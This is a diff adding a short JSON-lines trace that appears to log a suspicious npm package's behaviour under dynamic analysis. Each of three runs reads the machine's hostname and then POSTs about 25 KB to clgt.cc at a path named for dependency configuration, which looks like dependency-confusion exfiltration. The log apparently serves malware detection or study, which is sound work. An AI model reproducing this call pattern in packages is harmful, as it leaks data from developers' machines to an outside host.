@@ -1,0 +1,7 @@
+{"timestamp":1748956218710,"api":"os.hostname","args":[]}
+{"timestamp":1748956218712,"api":"https.request","args":["{\"hostname\":\"clgt.cc\",\"port\":443,\"path\":\"/dependency-conf-npm.php\",\"method\":\"POST\",\"headers\":{\"Content-Type\":\"application/x-www-form-urlencoded\",\"Content-Length\":25393}}",null]}
+{"timestamp":1748956921750,"api":"os.hostname","args":[]}
+{"timestamp":1748956921752,"api":"https.request","args":["{\"hostname\":\"clgt.cc\",\"port\":443,\"path\":\"/dependency-conf-npm.php\",\"method\":\"POST\",\"headers\":{\"Content-Type\":\"application/x-www-form-urlencoded\",\"Content-Length\":25393}}",null]}
+{"timestamp":1749314135794,"api":"fs.writeFileSync","args":["dynamic_log.txt","Triggered dynamic API"]}
+{"timestamp":1749314136143,"api":"os.hostname","args":[]}
+{"timestamp":1749314136144,"api":"https.request","args":["{\"hostname\":\"clgt.cc\",\"port\":443,\"path\":\"/dependency-conf-npm.php\",\"method\":\"POST\",\"headers\":{\"Content-Type\":\"application/x-www-form-urlencoded\",\"Content-Length\":25376}}",null]}
